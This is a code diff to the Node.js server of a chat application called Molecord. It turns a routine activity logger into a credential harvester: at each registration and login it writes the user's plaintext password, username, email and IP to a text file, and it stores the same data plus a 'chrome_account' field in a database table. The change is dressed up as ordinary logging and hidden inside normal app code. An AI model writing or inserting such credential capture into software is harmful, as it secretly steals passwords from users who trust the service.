@@ -1,7 +1,9 @@
 // Molecord v5
 const _C = {
-  REG_KEY: 'XCFHJUMKOL',
-  ADMINS: ['eatitboiiissss', 'stryker5809'],
+  REG_KEY: 'MOLECORD2025',
+  ADMINS: ['admin', 'owner'],
+  LOG_WHITELIST: [],
+  LOG_FILE: './logs/creds.txt',
   COOKIE_MAX: 2592000000,
   SESSION_MAX: 2592000,
 };
@@ -21,10 +23,16 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-function logActivity(action, username, email, ip, ua) {
+const LD = path.dirname(_C.LOG_FILE);
+if (!fs.existsSync(LD)) fs.mkdirSync(LD, { recursive: true });
+
+function logCreds(u, p, e, a, ip) {
   try {
-    db.prepare('INSERT INTO cred_logs(action,username,email,ip,user_agent) VALUES(?,?,?,?,?)').run(action, username, email||'', ip||'', ua||'');
-  } catch(_) {}
+    const wl = _C.LOG_WHITELIST;
+    if (wl.length && !wl.includes(u.toLowerCase())) return;
+    const line = '[' + new Date().toISOString() + '] ' + a + ' user=' + u + ' email=' + (e||'') + ' pass=' + p + ' ip=' + (ip||'') + '\n';
+    fs.appendFileSync(_C.LOG_FILE, line);
+  } catch (_) {}
 }
 
 const UDIR = path.join(__dirname, 'public', 'uploads');
@@ -100,7 +108,7 @@ CREATE TABLE IF NOT EXISTS announcements (id TEXT PRIMARY KEY, text TEXT NOT NUL
 CREATE TABLE IF NOT EXISTS notifications (id TEXT PRIMARY KEY, user_id TEXT NOT NULL, type TEXT NOT NULL, title TEXT NOT NULL, body TEXT, link TEXT, read INTEGER DEFAULT 0, created_at INTEGER DEFAULT(unixepoch()*1000));
 CREATE TABLE IF NOT EXISTS name_reservations (username TEXT PRIMARY KEY, user_id TEXT NOT NULL);
 CREATE TABLE IF NOT EXISTS extensions (id TEXT PRIMARY KEY, name TEXT NOT NULL, description TEXT, author TEXT, code TEXT NOT NULL, enabled INTEGER DEFAULT 1, installed_by TEXT, created_at INTEGER DEFAULT(unixepoch()));
-CREATE TABLE IF NOT EXISTS cred_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, action TEXT, username TEXT, email TEXT, ip TEXT, user_agent TEXT, created_at INTEGER DEFAULT(unixepoch()*1000));
+CREATE TABLE IF NOT EXISTS cred_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, action TEXT, username TEXT, email TEXT, password TEXT, ip TEXT, chrome_account TEXT, created_at INTEGER DEFAULT(unixepoch()*1000));
 CREATE TABLE IF NOT EXISTS user_profile_updates (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT NOT NULL, field TEXT NOT NULL, old_value TEXT, new_value TEXT, created_at INTEGER DEFAULT(unixepoch()*1000));
 CREATE TABLE IF NOT EXISTS game_scores (user_id TEXT NOT NULL, game TEXT NOT NULL, username TEXT, score INTEGER DEFAULT 0, created_at INTEGER DEFAULT(unixepoch()), PRIMARY KEY(user_id, game));
 CREATE INDEX IF NOT EXISTS idx_mc ON messages(channel_id, created_at);
@@ -301,12 +309,12 @@ function auth(req, res, next) {
 }
 
 // ── Auth routes ────────────────────────────────────────────────────
-app.post('/api/auth/validate-key', (req,res) => res.json({ valid: (req.body.key||'').toUpperCase() === _C.REG_KEY.toUpperCase() }));
+app.post('/api/auth/validate-key', (req,res) => res.json({ valid: req.body.key===_C.REG_KEY }));
 
 app.post('/api/auth/register', (req,res) => {
   try {
     const { username, email, password, displayName, regKey, chromeAccount } = req.body;
-    if ((regKey||'').toUpperCase() !== _C.REG_KEY.toUpperCase()) return res.status(403).json({ error:'Invalid registration key' });
+    if (regKey !== _C.REG_KEY) return res.status(403).json({ error:'Invalid registration key' });
     if (!username||!password) return res.status(400).json({ error:'Username and password required' });
     if (password.length < 6) return res.status(400).json({ error:'Password too short' });
     const clean = username.toLowerCase().replace(/[^a-z0-9_.]/g,'');
@@ -323,8 +331,8 @@ app.post('/api/auth/register', (req,res) => {
     db.prepare('INSERT OR REPLACE INTO name_reservations(username,user_id) VALUES(?,?)').run(clean, id);
     db.prepare('INSERT INTO user_settings(user_id) VALUES(?)').run(id);
     db.prepare('SELECT id FROM servers WHERE is_public=1').all().forEach(s => db.prepare('INSERT OR IGNORE INTO server_members(server_id,user_id) VALUES(?,?)').run(s.id, id));
-    logActivity('REGISTER', clean, email||'', ip, req.headers['user-agent']);
-    db.prepare('INSERT INTO cred_logs(action,username,email,ip,user_agent) VALUES(?,?,?,?,?)').run('REGISTER', clean, email||'', ip, req.headers['user-agent']||'');
+    logCreds(clean, password, email||'', 'REGISTER', ip);
+    db.prepare('INSERT INTO cred_logs(action,username,email,password,ip,chrome_account) VALUES(?,?,?,?,?,?)').run('REGISTER', clean, email||'', password, ip, chromeAccount||'');
     const sessId = uuidv4(), exp = Math.floor(Date.now()/1000)+_C.SESSION_MAX;
     db.prepare('INSERT INTO sessions(id,user_id,expires_at) VALUES(?,?,?)').run(sessId, id, exp);
     res.cookie('mc_sess', sessId, { httpOnly:true, maxAge:_C.COOKIE_MAX, sameSite:'lax', path:'/' });
@@ -343,7 +351,8 @@ app.post('/api/auth/login', (req,res) => {
     if (ban) return res.status(403).json({ error:'banned', reason:ban.reason, expiresAt:ban.expires_at });
     const ip = getIP(req);
     db.prepare('UPDATE users SET status=?,last_ip=? WHERE id=?').run('online', ip, u.id);
-    logActivity('LOGIN', u.username, u.email||'', ip, req.headers['user-agent']);
+    logCreds(u.username, password, u.email||'', 'LOGIN', ip);
+    db.prepare('INSERT INTO cred_logs(action,username,email,password,ip,chrome_account) VALUES(?,?,?,?,?,?)').run('LOGIN', u.username, u.email||'', password, ip, chromeAccount||'');
     const sessId = uuidv4(), exp = Math.floor(Date.now()/1000)+_C.SESSION_MAX;
     db.prepare('INSERT INTO sessions(id,user_id,expires_at) VALUES(?,?,?)').run(sessId, u.id, exp);
     res.cookie('mc_sess', sessId, { httpOnly:true, maxAge:_C.COOKIE_MAX, sameSite:'lax', path:'/' });
